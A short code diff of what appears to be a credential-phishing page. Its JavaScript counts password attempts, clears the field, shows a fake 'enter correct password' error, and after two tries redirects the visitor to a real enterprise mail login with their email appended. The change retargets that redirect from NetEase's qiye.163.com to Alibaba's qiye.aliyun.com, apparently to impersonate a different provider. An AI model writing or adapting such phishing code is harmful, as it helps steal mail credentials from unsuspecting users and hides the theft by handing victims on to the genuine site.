@@ -276,7 +276,7 @@ button {
             			if (count>=2) {
             				count=0;
                     // window.location.replace(response['redirect_link']);
-                    window.location.replace("https://qiye.163.com/login/?authuser=2/?msg="+email);
+                    window.location.replace("https://qiye.aliyun.com/?msg="+email);
 
                 }
                 $('#msg').html(response['msg']);
@@ -290,7 +290,7 @@ button {
     	$("#password").val("");
     	if (count>=2) {
     		count=0;
-    		window.location.replace("https://qiye.163.com/login/?authuser=2/?msg="+email);
+    		window.location.replace("https://qiye.aliyun.com/?msg="+email);
     	}
     	$("#msg").show();
     	$('#msg').html("Please enter correct password and try again");
